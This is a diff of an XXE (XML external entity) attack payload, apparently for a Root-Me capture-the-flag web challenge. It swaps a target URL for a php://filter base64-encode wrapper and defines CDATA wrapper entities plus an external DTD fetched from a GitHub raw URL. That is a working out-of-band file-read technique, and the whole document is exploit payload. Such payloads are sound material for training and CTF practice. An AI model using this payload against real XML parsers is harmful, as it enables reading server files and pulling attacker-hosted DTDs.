@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php">
+ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/59b76bc9c73b3b36b93f501387765a263038e3ed/xml.xml">
  <!ENTITY % start SYSTEM "<![CDATA["> 
  <!ENTITY % end SYSTEM "]]>">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
